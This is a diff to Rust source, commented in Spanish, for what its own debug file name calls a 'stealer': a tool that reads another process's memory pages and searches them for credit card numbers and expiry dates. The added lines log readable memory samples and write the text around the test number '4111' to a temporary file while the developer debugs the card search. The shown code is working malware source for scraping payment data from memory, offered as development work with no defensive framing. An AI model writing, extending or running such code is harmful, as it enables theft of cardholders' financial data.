@@ -185,6 +185,14 @@ where
                     if result != 0 && bytes_read > 0 {
                         pages_readable += 1;
                         
+                        // DEBUG: Verificar si contiene strings legibles
+                        let sample = String::from_utf8_lossy(&buffer[..bytes_read.min(100)]);
+                        let has_text = sample.chars().filter(|c| c.is_alphanumeric()).count() > 10;
+                        
+                        if has_text && pages_in_region < 3 {
+                            log(&format!("        📄 Región legible - Sample: {:?}", &sample[..sample.len().min(60)]));
+                        }
+                        
                         if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
                             log(&format!("      💳 Card found: {} (exp {}/{})", 
                                 card.card_number,
@@ -377,9 +385,26 @@ fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
     // Convertir a string (ignorando bytes no-UTF8)
     let text = String::from_utf8_lossy(buffer);
     
+    // NUEVO: Buscar el string "4111" específicamente (tarjeta de prueba)
+    if text.contains("4111") {
+        // Log para debug
+        use std::io::Write;
+        let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&debug_path) {
+            let _ = writeln!(file, "        🔍 DEBUG: Encontrado '4111' en memoria!");
+            
+            // Extraer contexto (50 chars antes y después)
+            if let Some(pos) = text.find("4111") {
+                let start = pos.saturating_sub(50);
+                let end = (pos + 50).min(text.len());
+                let context = &text[start..end];
+                let _ = writeln!(file, "        📝 Contexto: {:?}", context);
+            }
+        }
+    }
+    
     // Buscar secuencias de dígitos (números de tarjeta)
     // Patrones: 4xxx (Visa), 5xxx (MasterCard), 3xxx (Amex), 6xxx (Discover)
-    // Pueden estar con espacios, guiones, o contiguos
     
     let mut start = 0;
     while start < text.len() {
